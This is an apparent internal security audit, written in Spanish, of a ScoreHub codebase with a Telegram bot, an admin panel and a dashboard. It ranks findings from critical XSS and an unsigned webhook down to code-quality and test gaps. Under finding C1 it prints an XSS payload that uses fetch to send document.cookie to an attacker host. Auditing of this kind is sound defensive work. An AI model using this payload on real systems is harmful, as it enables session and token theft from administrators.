# Auditoría exhaustiva — ScoreHub (2026-Q3)

**Commit auditado:** `270f32c` (master)
**Fecha:** 2026-08-11
**Tamaño del codebase:** 147 archivos JS (~21.8k LOC) + 173 archivos TS/TSX (~243k LOC) + 24 migraciones SQL
**Documento de remediación:** [`audit-master-plan.md`](./audit-master-plan.md)

---

## Resumen ejecutivo

**Grado global: B+** (sin contar los hallazgos críticos sería A‑).

El proyecto está bien estructurado (Clean Architecture en migración, multi-competición, suite de tests no trivial), pero tiene **dos vulnerabilidades activas con exploit concreto** y un race condition detectable bajo carga. El resto son mejoras incrementales bien priorizadas.

### Distribución de hallazgos

| Severidad | # |
|---|---|
| Crítica (exploit concreto) | 2 |
| Media (DoS / privacy / hardening) | 6 |
| Baja (calidad / DX / anti-patterns) | 13 |
| Gaps de tests en código crítico | 9 |
| Limpieza / docs / legacy | 8 |
| **Total** | **38** |

---

## 🔴 Hallazgos críticos (bloquean deploy)

### C1 — XSS en admin (`admin/public/index.html`)

**Severidad:** Alta
**Vector:** XSS stored → DOM-based.

`admin/public/index.html` interpola texto user-controlled de `historial_consultas.consulta` directamente en sinks `innerHTML`/`insertAdjacentHTML`/`onclick` en 11 ubicaciones:

| Línea | Sink | Fuente |
|---|---|---|
| 412 | `container.innerHTML` | DB (consulta del usuario) |
| 415 | `${q.consulta}`, `${q.alias}`, `${q.tipo}` | DB |
| 435-449 | `tbody.innerHTML` con `q.consulta`, `q.respuesta` | DB |
| 442, 488 | `onclick="toggleResponse(this, '${q.id}')"` | DB |
| 481-498 | `insertAdjacentHTML('beforeend', …)` | DB |
| 534-553 | `tbody.innerHTML` con `u.alias`, `u.id`, `u.fecha_registro` | DB |
| 595-604 | `tbody.innerHTML` con `a.alias`, `a.id_usuario`, etc. | DB |
| 616-623 | `tbody.innerHTML` con `t.nombre_equipo`, `t.alias` | DB |

**Exploit:**
1. Usuario de Telegram manda `<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">`.
2. El bot lo guarda verbatim en `historial_consultas.consulta` (vía `telegramBot.js:62-64`).
3. Admin abre el panel → script ejecuta.
4. Admin está autenticado por Bearer token (no cookie por default), pero un keylogger/XSS puede exfiltrar el token de `localStorage` o el header Authorization.

**Mitigación:** ver [`phase-00-critical-security.md`](./phase-00-critical-security.md).

### C2 — Webhook sin firma (`src/interface/http/server.js:257-269`)

**Severidad:** Media-alta
**Vector:** Inyección de updates arbitrarias.

El handler `/webhook` no valida `X-Telegram-Bot-Api-Secret-Token`, header que Telegram soporta vía `setWebhook?secret_token=…`. Un atacante con la URL del webhook puede:

1. Inyectar updates arbitrarias.
2. Contaminar `historial_consultas` con data falsa.
3. Disparar el pipeline de Gemini (`messageHandler`) generando costos.
4. Disparar queries upstream a 365scores (DoS indirecto).

**No puede:** enviar mensajes outbound (la validación del token está en el lado de Telegram vía `sendMessage` con el `telegramToken` real).

**Mitigación:** ver [`phase-00-critical-security.md`](./phase-00-critical-security.md).

---

## 🟡 Hallazgos medios (race conditions, DoS, privacy)

### C3 — Race condition en `readThrough` (`database/db.js:451-511`)

Dos requests concurrentes para el mismo key invocan `fetcher()` y hacen `upsert()` raceantes. Mitigable con `Map<key, Promise>` estilo `jobGuard`. **Bajo riesgo de correctness** (single-row upsert), pero detectable bajo carga. Ver [`phase-02-race-conditions.md`](./phase-02-race-conditions.md).

### S3 — `teamController.js:99` — PostgREST `or` templated

```js
or: `(home_competitor_id.eq.${tid},away_competitor_id.eq.${tid})`,
```

`tid = Number(id)` aguas arriba protege contra injection, pero es string-templated frágil. Refactor a `db.execAdvanced` con `$1`. Ver Fase 1.1.

### S4 — `?limit=` sin upper bound en admin (`admin/server.js:69`)

```js
const limit = parseInt(req.query.limit) || 50;
// Sin clamp → ?limit=999999999 causa OOM
```

Mitigación: `Math.min(500, Math.max(1, …))`. Ver Fase 1.2.

### S5 — Sin rate limit en admin

A diferencia del dashboard (100 req/min), el admin no tiene rate limiting. Brute-force del token sin mitigación. Ver Fase 1.4.

### S6 — Sin `helmet` en admin ni bot HTTP

Dashboard sí tiene; admin y bot HTTP no. Mitigación trivial. Ver Fases 1.3 y 9.

### S8 — LIKE wildcards no escapados (`athleteController.js:215`)

```js
params.push(`%${String(search).toLowerCase()}%`);
```

Si user busca `100%`, recibe todos los matches. Mitigación: helper `escapeLike`. Ver Fase 1.6.

### S11 — PII en `/api/queries`

El endpoint devuelve `consulta` y `respuesta` completas sin redacción. Mitigación: truncar por default, requerir `?expand=1` para `respuesta`. Ver Fase 1.7.

### S9 — CORS production hardcodeado

`dashboard/server/index.js:18` lista `https://scorehub-pocho.vercel.app` y `https://scorehub-rust.vercel.app` como default. Si `CORS_ORIGINS` no está seteado, se aceptan estos orígenes. Mitigación: default restrictivo. Ver Fase 2.2.

---

## 🟢 Hallazgos bajos (calidad, anti-patterns, DX)

| # | Hallazgo | Ubicación | Fase |
|---|---|---|---|
| A1 | Ports vacíos (`module.exports = {}`) | `src/domain/ports/*` | 3 |
| A2 | Sync bypassa gateway (`context.js:11`) | `src/application/sync/context.js` | 3 |
| A3 | Wide bag sin typedef | `src/infrastructure/container.js:33-38` | 3 |
| A4 | 16 llamadas a `dotenv.config()` dispersas | varios | 4 |
| A5 | `console.*` en `src/interface/` (~50 sitios) | varios | 4 |
| A6 | Config dispersa en múltiples módulos | `services/config.js` + ad-hoc | 4 |
| A7 | `flushSync` nunca llamado en shutdown | `telegramBot.js`, `sync.js` | 5 |
| A8 | `syncGames` no-op alias | `src/application/sync/games.js` | 5 |
| A9 | `syncService` re-exports con spread | `syncService.js:62-72` | 5 |
| A10 | Dos mutexes `isRunning` | `liveGamesPoller.js`, `jobGuard.js` | 5 |
| A11 | SQL inline en HTTP handler | `src/interface/http/server.js:113-198` | 5 |
| A12 | `schema.sql` stale header "MySQL" | `database/schema.sql:2` | 6 |
| A13 | `migrate.js` sin concurrency lock | `database/migrate.js` | 6 |
| A14 | `DB_PASSWORD` empty-string fallback | `database/connection.js:54` | 6 |
| A15 | `bet_followers` v1 nunca dropeada | `database/migrations/003` | 6 |
| A16 | Sin CSP en dashboard | `dashboard/index.html` | 7 |
| A17 | Logger cliente activo en prod | `Logger.ts:46-48` | 7 |
| A18 | FIFO cache eviction | `InMemoryCache.ts:16-19` | 7 |
| A19 | Hook errors silenciados | `useGameDetail.ts:45-53`, etc. | 7 |
| A20 | `window.location.origin` fallback | `HttpClient.ts:18` | 7 |
| A21 | ADMIN_TOKEN min 8 chars | `utils/adminAuth.js:23` | 9 |
| A22 | Sin audit log en admin | `admin/server.js` | 9 |
| A23 | `.env.bak.1785973505` en disco | repo root | 10 |
| A24 | Scripts redundantes | `scripts/test-365-commands*`, `backfill-athletes-canonical.js` | 10 |
| A25 | Top-level `return` en legacy | `legacy/whatsapp-bot.js:17` | 12 |
| A26 | `processMessage` casos especiales | `telegramBot.js:73-150` | 12 |

---

## 🧪 Gaps de tests en código crítico

| Módulo | Por qué importa | Fase |
|---|---|---|
| `utils/logger.js` PII redaction | Si cae un path, leak de PII | 8 |
| `utils/adminAuth.js` constant-time | Token brute-force viable | 8 |
| `utils/processGuard.js` crash policy | Caída silenciosa | 8 |
| `utils/jobGuard.js` race protection | Race condition runtime | 8 |
| `database/db.js:assertIdent/SelectList` | SQL injection guards | 8 |
| `src/infrastructure/container.js` | Composition root regressions | 8 |
| `admin/server.js` | 0 tests para todo el admin | 8 |
| `services/scores365Service.js` HTTP end-to-end | Sólo static-analysis tests | — |
| `services/intentParser`, `geminiService`, etc. | NLU no testeado | — |

---

## 🧹 Limpieza / docs / legacy

| Item | Fase |
|---|---|
| `.env.bak.*` purge | 10 |
| Snapshots Jest obsoletos | 10 |
| `.gitignore` defensive additions (`.pem`, `.key`) | 10 |
| `docs/security.md` nuevo | 11 |
| `docs/env-vars.md` sync | 11 |
| `README.md` actualizar tareas manuales | 11 |
| `docs/architecture.md` sync Fases 3-5 | 11 |
| `legacy/whatsapp-bot.js` documentar estado permanente | 12 |

---

## Métricas de calidad

| Métrica | Valor |
|---|---|
| LOC backend (raíz) | ~21,800 |
| LOC frontend (dashboard) | ~243,500 |
| Tests files | 19 |
| Test coverage global | < 50% (estimado, sin threshold activo) |
| Migrations SQL | 24 (+ 1 pendiente en Fase 6) |
| Vulnerabilidades activas | 2 |
| Race conditions | 1 |
| SQL injection vectors | 0 (gracias a guards) |
| XSS vectors | 11 (en admin) |
| Secrets hardcoded | 0 |
| `eval()` / `Function()` | 0 |
| Command injection vectors | 0 |

---

## Causa raíz estructural

La auditoría reveló tres causas raíz recurrentes:

1. **Strangler fig incompleto**: `src/` y `legacy/` coexisten, pero la regla "application sólo importa ports" se viola en `sync/context.js:11` que requiere `services/scores365Service` directamente.

2. **Configuración dispersa**: el módulo `services/config.js` lee `PRIMARY_COMPETITION_ID` en module-load, mientras `src/infrastructure/config.js` lee otras 3 vars. Otros módulos leen `process.env` ad-hoc. No hay un único "config object" en runtime.

3. **Tests no priorizan seguridad**: 19 test files cubren sync, router, lifecycle, callbacks, dashboard components — pero 0 tests directos para `assertIdent`, `adminAuth`, `processGuard`. La regla "security-critical code needs security tests" no se aplica.

Estas tres causas se abordan en las Fases 3, 4 y 8 respectivamente.

---

## Próximo paso

Ejecutar Fase 0 según [`phase-00-critical-security.md`](./phase-00-critical-security.md). PR bloqueante para deploy.